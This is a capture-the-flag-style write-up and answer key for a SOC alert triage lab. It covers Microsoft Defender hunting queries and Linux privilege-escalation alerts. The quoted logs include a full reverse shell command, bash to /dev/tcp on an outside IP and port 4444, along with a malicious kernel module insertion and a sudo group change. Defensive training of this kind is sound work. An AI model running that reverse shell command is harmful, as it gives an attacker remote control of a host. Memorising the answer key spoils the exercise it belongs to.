# Day 10: SOC Alert Triaging - Tinsel Triage

> The Best Festival Company's Security Operations Center was in chaos. Screens flickered, lights flashed, and the sound of alerts echoed through the room like a digital thunderstorm. The elves rushed between consoles, their faces lit by the glow of red and orange warnings. It was raining alerts, and no one knew where the storm had begun. <br>
> Whispers spread through the SOC as tension filled the air. Something strange was happening across the cloud environment, and the timing couldn't be worse. As the blizzard of alerts grew heavier, one name surfaced among the worried elves: the evil Easter Bunnies. But why now? And what were they after this time?

## Solution

### Task 4: Investigation Proper

- To view the number of entities affected by the `Polkit Exploit Attempt` we can go to Incidents > Defender Portal > Search for "Polkit" > Expand the incident > Click on the Polkit incident > Check the number of devices which is `10`
- We can check for the severity of the `Sudo Shadow Access` by searching for it on the defender portal
- For the incident `User Added to Sudo Group`, there were 4 users and 11 devices that were effected

### Task 5: Diving Deeper Into Logs

- For Task 5, on Microsoft Defender we navigate to Investigation & Response > Hunting > Advanced Hunting to enter our queries
- By running the script
```
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'websrv-01'
| project _timestamp_t, host_s, Message
```
- We see a record of 9th Oct with the host as websrv-01 and the msg as `kernel: [625465] audit: type=1130 audit(1759996669:1161): id=622 op=insert_module name=malicious_mod.ko uid=0`
- Another record mentions `sudo:   ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1` which is the ops user executing a command
- TO see the first successful SSH login, we change he host_s to `storage-01`, sort it by ascending and search for SSH in the result table to find the IP as `172.16.0.12`
- To see the external source IP which logged in as root to app-01, change the host_s in the command to app-01 instead of websrv-01
- Sort the result by ascending and note the IP as `203.0.113.45`
- A record says `usermod: user 'deploy' added to group 'sudo' by uid=0 (usermod -aG sudo deploy)` saying that another `deploy` user was added aside from the backup user

## Objectives

### How many entities are affected by the Linux PrivEsc - Polkit Exploit Attempt alert?
> 10

### What is the severity of the Linux PrivEsc - Sudo Shadow Access alert?
> High

### How many accounts were added to the sudoers group in the Linux PrivEsc - User Added to Sudo Group alert?
> 4

### What is the name of the kernel module installed in websrv-01?
> malicious_mod.ko

### What is the unusual command executed within websrv-01 by the ops user?
> /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1

### What is the source IP address of the first successful SSH login to storage-01?
> 172.16.0.12

### What is the external source IP that successfully logged in as root to app-01?
> 203.0.113.45

### Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?
> deploy

## Concepts learnt:

- Understand the importance of alert triage and prioritisation
- Explore Microsoft Sentinel to review and analyse alerts